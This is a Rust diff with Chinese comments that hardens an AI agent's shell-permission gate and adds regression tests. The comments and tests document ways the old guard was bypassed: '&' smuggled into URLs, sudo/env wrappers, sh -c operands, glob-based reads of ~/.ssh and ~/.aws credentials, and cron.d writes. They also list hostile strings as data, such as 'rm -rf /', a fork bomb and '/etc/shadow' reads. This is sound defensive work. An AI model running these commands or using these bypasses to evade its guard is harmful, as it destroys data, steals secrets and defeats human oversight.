@@ -147,11 +147,6 @@ pub struct MetacharHit {
     pub construct: String,
 }
 
-fn looks_like_url(s: &str) -> bool {
-    let lower = s.trim_start().to_lowercase();
-    lower.starts_with("http://") || lower.starts_with("https://")
-}
-
 /// Find the first shell-interpolation construct in `operand`.
 ///
 /// `url_context` tolerates `&` (query separator) but never `;`, `|`, backticks,
@@ -179,10 +174,65 @@ pub fn find_shell_metachar(operand: &str, url_context: bool) -> Option<String> {
         }
     }
     // Bare `&` backgrounds a command; harmless inside a real URL query.
-    if operand.contains('&') && !(url_context && looks_like_url(operand)) {
+    //
+    // 豁免必须建立在**整条操作数解析成一个 URL**之上,不能只看前缀。旧判据是
+    // `looks_like_url`,而它只做 `trim_start().to_lowercase().starts_with("http://"/"https://")`
+    // —— 于是 `url_arg_tools` 里的工具拿到的是一张对 `&` 的无条件通行证,`&` 后面接什么
+    // 都行,效果和被明确拒绝的 `;` 一模一样:
+    //
+    // ```text
+    // 'https://ok.example/x; rm -rf ~'  -> Deny  [SHELL-METACHAR]   （文档自己的例子）
+    // 'https://ok.example/x& rm -rf ~'  -> Allow [SHELL-ALLOWLIST]  （把 ; 换成 &）
+    // ```
+    //
+    // 而这在真实 shell 里确实执行:`curl -s https://ok.example/& rm -rf <dir>` 真的把目录
+    // 删掉了。`"https://& id"`、前导空白、大写 `HTTPS://` 全部曾经放行。
+    if operand.contains('&') && !(url_context && is_parseable_url(operand)) {
         return Some("&".to_string());
     }
     None
+}
+
+/// 整条操作数是**一个**能解析的 http(s) URL 吗。
+///
+/// 不引 URL 解析库:这里要的判据比通用解析更严 —— 除了结构合法,还要求"没有任何一段
+/// 是 shell 会另眼看待的东西"。判据:
+///   * 前缀是 `http://` 或 `https://`(大小写不敏感);
+///   * 整条没有空白 —— 一个真实 URL 里的空格必须是 `%20`,而 `x& rm -rf ~` 靠的正是空格;
+///   * authority 段非空且只含 URL 允许的字符;
+///   * `&` 只出现在 `?` 或 `#` **之后**(query/fragment 里),那才是它的合法位置。
+fn is_parseable_url(operand: &str) -> bool {
+    let s = operand.trim();
+    let lower = s.to_lowercase();
+    let rest = if lower.starts_with("https://") {
+        &s[8..]
+    } else if lower.starts_with("http://") {
+        &s[7..]
+    } else {
+        return false;
+    };
+    if s.chars().any(char::is_whitespace) {
+        return false;
+    }
+    // authority = 到第一个 `/` `?` `#` 为止。
+    let auth_end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
+    let authority = &rest[..auth_end];
+    if authority.is_empty() {
+        return false;
+    }
+    if !authority
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '.' | ':' | '_' | '[' | ']' | '@'))
+    {
+        return false;
+    }
+    // `&` 必须在 query/fragment 里。
+    let q = s.find(['?', '#']);
+    match (s.find('&'), q) {
+        (None, _) => true,
+        (Some(amp), Some(qi)) => amp > qi,
+        (Some(_), None) => false,
+    }
 }
 
 fn escape_for_detail(c: char) -> String {
@@ -219,14 +269,26 @@ pub struct SafeShell {
 
 impl SafeShell {
     pub fn from_policy(policy: ShellPolicy) -> Self {
-        let allowlisted = policy.allowlisted_tools.iter().cloned().collect();
-        let denied = policy.denied_actions.iter().cloned().collect();
-        let confirm = policy.require_confirm.iter().cloned().collect();
-        let url_tools = policy
-            .url_arg_tools
-            .iter()
-            .map(|t| t.to_lowercase())
-            .collect();
+        // 四个集合**一起**做小写归一化。
+        //
+        // 以前只有 `url_arg_tools` 做了 —— 也就是唯一一个**授予豁免**的那个 —— 而
+        // `allowlisted_tools` / `denied_actions` / `require_confirm` 按原文存进 HashSet。
+        // 查表时 tool/verb 已经被 lowercase 过了,所以一份写着 `denied_actions: [Payment]`
+        // 的策略里,那条禁令是个彻底的空操作:
+        //
+        // ```text
+        // 大写 Payment  -> Allow SHELL-ALLOWLIST
+        // 小写 payment  -> Deny  SHELL-DENIED-ACTION
+        // ```
+        //
+        // YAML 里的大小写是人写的,而这条差别没有任何提示。
+        let lower = |v: &Vec<String>| -> std::collections::HashSet<String> {
+            v.iter().map(|t| t.to_lowercase()).collect()
+        };
+        let allowlisted = lower(&policy.allowlisted_tools);
+        let denied = lower(&policy.denied_actions);
+        let confirm = lower(&policy.require_confirm);
+        let url_tools = lower(&policy.url_arg_tools);
         Self {
             policy,
             allowlisted,
@@ -236,6 +298,27 @@ impl SafeShell {
             workspace: paths::Workspace::default(),
             resolve_ctx: paths::ResolveContext::current(),
         }
+    }
+
+    /// 测试用的宽松策略:什么都允许、什么都不禁、不要确认。
+    ///
+    /// 存在的理由是让"引擎判决怎么被翻译成 Outcome"这类测试能真正看到引擎那一步 ——
+    /// 否则 shell 那道门会先把输入挡掉,测试就在证明一件别的事。
+    #[cfg(any(test, feature = "test-helpers"))]
+    pub fn permissive_for_tests() -> Self {
+        Self::from_policy(ShellPolicy {
+            policy_id: "test-permissive".into(),
+            version: "0".into(),
+            allowlisted_tools: vec![
+                "run_terminal".into(),
+                "write_file".into(),
+                "read_file".into(),
+            ],
+            denied_actions: vec![],
+            require_confirm: vec![],
+            deny_shell_metacharacters: false,
+            url_arg_tools: vec![],
+        })
     }
 
     /// 装上路径天花板。返回被丢弃的授权条目，调用方应当报告它们——一条归约不了的授权
@@ -384,7 +467,47 @@ impl SafeShell {
         // 一、无条件敏感：跟有没有声明工作区无关。
         for claim in &claims {
             if let Some(resolved) = &claim.resolved {
-                if let Some(why) = paths::sensitive_target(resolved, claim.intent) {
+                // `sensitive_target` 内部读 `ResolveContext::current().home`,也就是**进程**
+                // 的 `$HOME`,而 `~` 的展开用的是 `self.resolve_ctx`。两者不一致时,"这是
+                // 家目录本身"这条检查静默不成立。讽刺的是
+                // `b0_自查回归::家目录检查不依赖环境变量` 这条测试的教训正是这个,但它直接
+                // 调 `sensitive_target_with_home`,所以从未覆盖 `SafeShell` 的实际调用点。
+                if let Some(why) = paths::sensitive_target_with_home(
+                    resolved,
+                    claim.intent,
+                    self.resolve_ctx.home.as_deref(),
+                ) {
+                    return Some(ShellVerdict::new(
+                        ShellDecision::Deny,
+                        "SHELL-PATH-SENSITIVE",
+                        format!("{} {:?}：{why}", claim.intent.as_str(), claim.operand),
+                    ));
+                }
+            }
+        }
+
+        // 一点五、归约不出来的**读**,如果字面形状指向凭据目录,同样拒绝。
+        //
+        // 第一步(无条件敏感)要求 `claim.resolved` 是 `Some`,而第二步和第三步都只对写生效。
+        // 于是"归约失败 + Read 意图"三步全跳过 = 直接放行。而凭据目录是这个模块对读设的
+        // **唯一**防线,加一个通配符就能让归约失败:
+        //
+        // ```text
+        // /root/.ssh/id_rsa   -> Deny [SHELL-PATH-SENSITIVE]
+        // ~/.ssh/id_rsa       -> Deny [SHELL-PATH-SENSITIVE]
+        // ~/.ssh/*            -> Allow [SHELL-ALLOWLIST]     <- 通配符让归约失败
+        // ~root/.ssh/id_rsa   -> Allow [SHELL-ALLOWLIST]     <- ~user 让归约失败
+        // /home/*/.ssh/id_rsa -> Allow [SHELL-ALLOWLIST]
+        // ```
+        //
+        // 而这两个构造在真实 shell 里确实做它们看起来在做的事:`*` 真的跨用户读到别人的
+        // 私钥,`~user` 真的展开成那个用户的家目录。`read_file`/`grep` 都是白名单工具且不
+        // 在 `require_confirm` 里,所以是干净的 `Allow`,连一次确认都没有。
+        //
+        // 所以"无条件敏感"这一类必须能对**未归约**的操作数发言:用字面前缀去比凭据目录表。
+        for claim in &claims {
+            if claim.unprovable.is_some() {
+                if let Some(why) = paths::sensitive_literal(&claim.operand, claim.intent) {
                     return Some(ShellVerdict::new(
                         ShellDecision::Deny,
                         "SHELL-PATH-SENSITIVE",
@@ -395,19 +518,28 @@ impl SafeShell {
         }
 
         // 二、归约不出来的：证明不了包含关系。判 Ask，理由写清是"证明不了"而不是"已确认危险"。
+        //
+        // **读也适用。** 这里以前有一个 `if claim.intent.needs_write()`,于是"归约失败 +
+        // Read 意图"在三步里全部落空,得到的是干净的 `Allow` —— 一个**沉默**的放行。
+        //
+        // 这个模块的标准就写在这条规则的理由里:"证明不了落在授权内,因此不能放行"。它对写
+        // 成立,对读同样成立 —— 而让归约失败恰恰是最省事的绕过手段(通配符、`~user`、
+        // 超长路径)。把读一并纳入不等于"让每一次 grep 都要确认":正常路径归约得出来,
+        // 不受影响;归约不出来的本来就只有这几类,而它们值得一次确认而不是沉默。
+        //
+        // 判 `Ask` 而不是 `Deny`:代价是一次提示,而不是把功能关掉。凭据目录那一类在上面
+        // 第一点五步已经用字面形状 `Deny` 掉了,所以真正危险的那一格不靠这一步。
         for claim in &claims {
             if let Some(why) = &claim.unprovable {
-                if claim.intent.needs_write() {
-                    return Some(ShellVerdict::new(
-                        ShellDecision::Ask,
-                        "SHELL-PATH-UNPROVABLE",
-                        format!(
-                            "无法把 {} 目标 {:?} 归约成一个路径：{why}。证明不了落在授权内，因此不能放行。",
-                            claim.intent.as_str(),
-                            claim.operand
-                        ),
-                    ));
-                }
+                return Some(ShellVerdict::new(
+                    ShellDecision::Ask,
+                    "SHELL-PATH-UNPROVABLE",
+                    format!(
+                        "无法把 {} 目标 {:?} 归约成一个路径：{why}。证明不了落在授权内，因此不能放行。",
+                        claim.intent.as_str(),
+                        claim.operand
+                    ),
+                ));
             }
         }
 
@@ -466,7 +598,27 @@ impl SafeShell {
             .operands()
             .filter(|o| paths::looks_like_path(o))
             .collect();
-        let intents = paths::assign_intents(verb, &action.args, operands.len());
+        // 意图推断的 haystack 里必须包含 `target`,不只是 `args`。
+        //
+        // MCP 映射里 `argv[1]` 就是 `target`,所以 `sudo rm -rf X` 的那个 `rm` 对意图推断
+        // 是**不可见**的 → 判成 Read → 越界检查(只对写生效)整个不跑 → `Deny` 降成 `Ask`:
+        //
+        // ```text
+        // ["rm",  "-rf", <天花板外>]  intent=Delete  Deny SHELL-PATH-OUTSIDE  网关=Refuse
+        // ["sudo","rm","-rf", …]      intent=Read    Ask  SHELL-CONFIRM       网关=问人
+        // ["env"/"nice"/"busybox"/"xargs", "rm", …]  同样降级
+        // ["timeout","5","rm", …]     intent=Delete  Deny                     ← 正确
+        // ```
+        //
+        // 最后一行恰好证明了差别的来源:`timeout` 时 `rm` 落在 `args` 里,所以看得见。
+        // 按这个模块自己写下的标准("一个无条件危险的目标必须先被拒绝,而不是被拿去问人"),
+        // 前面那几行都是降级。
+        let mut haystack: Vec<String> = Vec::with_capacity(action.args.len() + 1);
+        if let Some(t) = &action.target {
+            haystack.push(t.clone());
+        }
+        haystack.extend(action.args.iter().cloned());
+        let intents = paths::assign_intents(verb, &haystack, operands.len());
         operands
             .into_iter()
             .zip(intents)
@@ -1016,6 +1168,321 @@ mod b0_自查回归 {
         assert_eq!(
             infer_intent("run_terminal", &["dd".into()]),
             PathIntent::Delete
+        );
+    }
+}
+
+/// 第五轮独立复核:路径模型可以被伪造、被隐藏、被跳过。
+///
+/// 这一轮的结论是:元字符筛子本身**忠实实现了它声称的那张清单**,三条核心承诺(先于
+/// 白名单、`argv()` 在 Deny 时为 `None`、`shell_quote` 正确)都成立。绕过点全在文档
+/// 当时完全没有描述的那一层**路径模型**:它把"能不能归约成一条落在天花板内的路径"当成
+/// 安全证明,而这个证明可以被伪造(整条命令当相对路径)、被隐藏(藏进 flag)、被跳过
+/// (读侧、意图降级)、或者被符号链接掀翻。
+///
+/// 而网关又用这个证明去**免掉人工确认**,所以每一次伪造的代价不是"多问一次",是
+/// "一次都不问"。下面每条测试对应一个被实测执行过的副作用。
+#[cfg(test)]
+mod b5_路径模型复核 {
+    use super::*;
+    use crate::paths::ResolveContext;
+    use std::path::PathBuf;
+
+    fn sh() -> SafeShell {
+        let (s, rejected) = SafeShell::from_policy(ShellPolicy::default_embedded())
+            .with_workspace(vec!["/tmp/ag-b5/ws"], vec!["/tmp/ag-b5/ws"]);
+        assert!(rejected.is_empty(), "夹具授权应当全部归约成功:{rejected:?}");
+        s.with_resolve_context(ResolveContext {
+            home: Some(PathBuf::from("/tmp/ag-b5/home")),
+            cwd: Some(PathBuf::from("/tmp/ag-b5/ws")),
+        })
+    }
+
+    fn act(tool: &str, verb: &str, target: &str, args: &[&str]) -> ShellAction {
+        ShellAction {
+            tool: tool.into(),
+            action: Some(verb.into()),
+            target: Some(target.into()),
+            args: args.iter().map(|s| s.to_string()).collect(),
+        }
+    }
+
+    /// 一个操作数携带整条命令,不能被归约成"落在天花板内的一条路径"。
+    ///
+    /// 复核实测的完整链条:`looks_like_path` 把任何含 `/` 的字符串当路径,`resolve` 把它
+    /// 当相对路径拼到 cwd 上,于是 `sh -c "rm -rf /"` 里那条命令被归约成 `<cwd>/rm -rf`,
+    /// 判成"在写授权内",`Deny` 降成 `Ask`,再被网关的天花板预授权升级成**直接执行**:
+    ///
+    /// ```text
+    /// ① 直写 rm -rf <天花板外>       -> Refuse
+    /// ② sh -c "rm -rf <同一个目录>"  -> Execute,文件真的被删,一次都没问人
+    ///    审计记的路径是 "<cwd>/rm -rf <目录>" —— 一个永远不会被碰的路径
+    /// ```
+    ///
+    /// 不是 `sh` 特有的,所以给 argv[0] 加黑名单修不了 —— `python3 -c` 走同一条路。
+    /// 元字符筛子放过这些 payload 是**正确**的(`rm -rf /` 里没有 `;|&$`);问题在路径层。
+    #[test]
+    fn 携带整条命令的操作数不能被归约成天花板内的路径() {
+        let sh = sh();
+        for (verb, args) in [
+            ("sh", vec!["-c", "rm -rf /"]),
+            ("sh", vec!["-c", "find / -depth -delete"]),
+            ("bash", vec!["-c", "cat /etc/shadow"]),
+            (
+                "python3",
+                vec!["-c", "open('/tmp/ag-b5/outside/p.txt','w').write('X')"],
+            ),
+            ("perl", vec!["-e", "unlink glob '/tmp/ag-b5/outside/*'"]),
+        ] {
+            let v = sh.evaluate(&act("run_terminal", verb, args[0], &args[1..]));
+            assert_ne!(
+                v.decision,
+                ShellDecision::Allow,
+                "{verb} {args:?} 被放行了 —— {}",
+                v.rule_id
+            );
+            // 关键断言不是"不 Allow",而是"那个虚构的归约结果不存在"。
+            let claims = sh.path_claims(&act("run_terminal", verb, args[0], &args[1..]));
+            for c in &claims {
+                if let Some(r) = &c.resolved {
+                    let disp = r.display().to_string();
+                    assert!(
+                        !disp.contains(' ') || !disp.starts_with("/tmp/ag-b5/ws"),
+                        "把一条命令归约成了天花板内的路径:{disp}"
+                    );
+                }
+            }
+        }
+    }
+
+    /// `--flag=PATH` 里的路径必须被看见。
+    ///
+    /// 复核实测:`cp --target-directory=/etc/cron.d SRC` 的写目标从判决里整个消失,
+    /// 只剩来源被判,而来源在天花板内 —— 于是天花板"证明"通过、免确认、执行,
+    /// `/etc/cron.d/evil.conf` 真的被创建出来。对照 `cp SRC /etc/cron.d/evil` 是 `Deny`。
+    #[test]
+    fn flag_里的路径也要被判() {
+        let sh = sh();
+        for (verb, args) in [
+            ("cp", vec!["--target-directory=/etc/cron.d", "a.conf"]),
+            ("curl", vec!["--output=/etc/cron.d/x", "https://e.example"]),
+            ("tee", vec!["--output-error=warn", "/etc/hosts"]),
+        ] {
+            let a = act("run_terminal", verb, args[0], &args[1..]);
+            let claims = sh.path_claims(&a);
+            let seen: Vec<&str> = claims.iter().map(|c| c.operand.as_str()).collect();
+            let has_etc = claims.iter().any(|c| {
+                c.operand.contains("/etc")
+                    || c.resolved.as_ref().is_some_and(|r| r.starts_with("/etc"))
+            });
+            assert!(
+                has_etc,
+                "{verb} {args:?}:写进 /etc 的那个路径在判决里根本没出现 —— 看到的是 {seen:?}"
+            );
+        }
+    }
+
+    /// 凭据目录对**读**也必须生效,哪怕归约失败。
+    ///
+    /// 三步全跳过是实测结论:第一步(无条件敏感)要求 `resolved` 是 `Some`,第二三步都只
+    /// 对写生效。于是加一个通配符或 `~user` 就让归约失败,读得到干净的 `Allow`:
+    ///
+    /// ```text
+    /// /root/.ssh/id_rsa   -> Deny          ~/.ssh/*            -> Allow  ✗
+    /// ~/.ssh/id_rsa       -> Deny          ~root/.ssh/id_rsa   -> Allow  ✗
+    ///                                      /home/*/.ssh/id_rsa -> Allow  ✗
+    /// ```
+    ///
+    /// 而这两个构造在真实 shell 里确实做它们看起来在做的事:`*` 真的跨用户读到别人的私钥,
+    /// `~user` 真的展开成那个用户的家目录。
+    #[test]
+    fn 归约不出来的凭据读也不放行() {
+        let sh = sh();
+        for p in [
+            "~/.ssh/*",
+            "~root/.ssh/id_rsa",
+            "/home/*/.ssh/id_rsa",
+            "/root/.ssh/id_?sa",
+            "~/.aws/*",
+            "~otheruser/.gnupg/secring.gpg",
+            "/home/*/.git-credentials",
+        ] {
+            let v = sh.evaluate(&act("read_file", "read", p, &[]));
+            assert_eq!(
+                v.decision,
+                ShellDecision::Deny,
+                "{p:?} 被放行了(rule={}) —— 凭据目录是这个模块对读的唯一防线",
+                v.rule_id
+            );
+        }
+    }
+
+    /// 反面:名字里带 `.ssh` 的普通目录、以及授权内的普通读,不能被上面那条误伤。
+    #[test]
+    fn 字面凭据判据不误伤普通路径() {
+        let sh = sh();
+        for p in [
+            "/tmp/ag-b5/ws/notes.txt",
+            "/tmp/ag-b5/ws/.sshfoo/notes.txt",
+            "/tmp/ag-b5/ws/my-ssh-notes/readme.md",
+            "/tmp/ag-b5/ws/sshconfig.bak",
+        ] {
+            let v = sh.evaluate(&act("read_file", "read", p, &[]));
+            assert_ne!(
+                v.decision,
+                ShellDecision::Deny,
+                "{p:?} 被误拒(rule={}) —— 误拒的代价是让人把守卫关掉",
+                v.rule_id
+            );
+        }
+    }
+
+    /// 透明包装器后面的动词决定意图 —— `sudo rm` 是删除,不是读。
+    ///
+    /// `path_claims` 只把 `&action.args` 交给 `assign_intents`,而 MCP 映射里 `argv[1]` 是
+    /// `target`,所以 `sudo rm -rf X` 的 `rm` 对意图推断不可见 → 判成 Read → 越界检查
+    /// (只对写生效)整个不跑 → `Deny` 降成 `Ask`。`timeout 5 rm …` 反而正确,因为那时
+    /// `rm` 落到了 `args` 里 —— 这一格恰好证明差别来自"`target` 不进 haystack"。
+    #[test]
+    fn 透明包装器不降低意图() {
+        let sh = sh();
+        let bare = sh.evaluate(&act("run_terminal", "rm", "-rf", &["/tmp/ag-b5/outside"]));
+        assert_eq!(bare.decision, ShellDecision::Deny, "基线:直写 rm 应当被拒");
+        for wrapper in ["sudo", "env", "nice", "ionice", "busybox", "xargs", "nohup"] {
+            let v = sh.evaluate(&act(
+                "run_terminal",
+                wrapper,
+                "rm",
+                &["-rf", "/tmp/ag-b5/outside"],
+            ));
+            assert_eq!(
+                v.decision, bare.decision,
+                "{wrapper} rm -rf 的判决({:?}/{}) 和直写 rm({:?}/{}) 不同 —— 包一层前缀就降级了",
+                v.decision, v.rule_id, bare.decision, bare.rule_id
+            );
+        }
+    }
+
+    /// `&` 的 URL 豁免必须建立在**整条操作数解析成一个 URL**之上。
+    ///
+    /// 旧判据只看前缀,于是 `url_arg_tools` 拿到的是一张对 `&` 的无条件通行证:
+    ///
+    /// ```text
+    /// 'https://ok.example/x; rm -rf ~'  -> Deny   （文档自己的例子)
+    /// 'https://ok.example/x& rm -rf ~'  -> Allow  （把 ; 换成 &)
+    /// ```
+    ///
+    /// 而 `curl -s 'https://ok.example/&' rm -rf <dir>` 在真实 shell 里真的把目录删掉了。
+    /// 仓库原有的 `ampersand_exemption_is_narrow` 测了两格,唯独漏掉唯一有意义的那一格 ——
+    /// 测试名断言的正是这个不成立的性质。
+    #[test]
+    fn url的与号豁免要求整条解析成url() {
+        let sh = sh();
+        for bad in [
+            "https://ok.example/x& rm -rf ~",
+            "https://& id",
+            "  https://x& touch /tmp/p",
+            "HTTPS://X& touch /tmp/p",
+            "https://ok.example/x&rm",
+            "http://a& :(){ :|:& };:",
+        ] {
+            let v = sh.evaluate(&act("web_fetch", "fetch", bad, &[]));
+            assert_eq!(
+                v.decision,
+                ShellDecision::Deny,
+                "{bad:?} 被放行了(rule={}) —— & 之后可以是任意 shell",
+                v.rule_id
+            );
+        }
+    }
+
+    /// 反面:真正的 URL query 仍然通过,否则这条修复就是把功能关掉。
+    #[test]
+    fn 真正的url_query仍然通过() {
+        let sh = sh();
+        for good in [
+            "https://ok.example/x?a=1&b=2",
+            "https://ok.example/search?q=rust&hl=en&safe=off",
+            "https://user@host.example:8443/p?x=1&y=2#frag",
+            "https://ok.example/path/to/thing",
+        ] {
+            let v = sh.evaluate(&act("web_fetch", "fetch", good, &[]));
+            assert_ne!(
+                v.decision,
+                ShellDecision::Deny,
+                "{good:?} 被误拒(rule={}) —— 真实 URL 的 query 必须能过",
+                v.rule_id
+            );
+        }
+    }
+
+    /// 策略里的大写条目不能静默失效。
+    ///
+    /// 四个集合里以前只有 `url_arg_tools` 做了小写归一化 —— 也就是唯一一个**授予豁免**
+    /// 的那个。于是 `denied_actions: [Payment]` 是个彻底的空操作。
+    #[test]
+    fn 大写的策略条目仍然生效() {
+        for spelling in ["Payment", "PAYMENT", "PaYmEnT"] {
+            let sh = SafeShell::from_policy(ShellPolicy {
+                policy_id: "t".into(),
+                version: "0".into(),
+                allowlisted_tools: vec!["run_terminal".into()],
+                denied_actions: vec![spelling.into()],
+                require_confirm: vec![],
+                deny_shell_metacharacters: true,
+                url_arg_tools: vec![],
+            });
+            let v = sh.evaluate(&act("run_terminal", "payment", "x", &[]));
+            assert_eq!(
+                v.decision,
+                ShellDecision::Deny,
+                "denied_actions:[{spelling}] 之下 action=payment 竟然 {:?}({})",
+                v.decision,
+                v.rule_id
+            );
+        }
+    }
+
+    /// `paths: {read: [], write: []}` 是"明确不给",不是"没声明"。
+    ///
+    /// 实现从"两个列表都空"反推出"没声明",而仓库自己的 `task-plans.yaml` 里
+    /// `navigation_jump` 就是这个形状 —— 它的写得到 `Ask SHELL-PATH-UNSCOPED` 而不是
+    /// `Deny`。注释本来就写对了,是代码没跟上。
+    #[test]
+    fn 声明为空不等于没声明() {
+        assert!(
+            !paths::Workspace::undeclared().is_declared(),
+            "没声明就是没声明"
+        );
+        let (empty, rejected) = paths::Workspace::new(Vec::<String>::new(), Vec::<String>::new());
+        assert!(rejected.is_empty());
+        assert!(
+            empty.is_declared(),
+            "read:[] write:[] 是一次明确的声明(明确不给),不是没声明"
+        );
+    }
+
+    /// 超长操作数不能让一次 `evaluate` 变成秒级。
+    ///
+    /// `canonicalize_existing_prefix` 每轮弹掉一个分量再对一条 O(n) 长的路径重做
+    /// `canonicalize`,总代价 O(n²);而 MCP 的 argv 元素长度无上限、主循环单线程。
+    /// 实测 1 MB 操作数 = 26.4 秒,4 MB ≈ 7 分钟,一次调用把所有工具调用一起卡住。
+    #[test]
+    fn 超长操作数不拖垮判决() {
+        let sh = sh();
+        let long = "a/".repeat(512_000);
+        let t = std::time::Instant::now();
+        let v = sh.evaluate(&act("read_file", "read", &long, &[]));
+        let dt = t.elapsed();
+        assert!(
+            dt < std::time::Duration::from_secs(2),
+            "1 MB 操作数耗时 {dt:?} —— 二次项还在"
+        );
+        // 而且不能因为快就变成放行。
+        assert_ne!(
+            v.decision,
+            ShellDecision::Allow,
+            "一条 512000 个分量的路径不该被当成正常路径放行"
         );
     }
 }
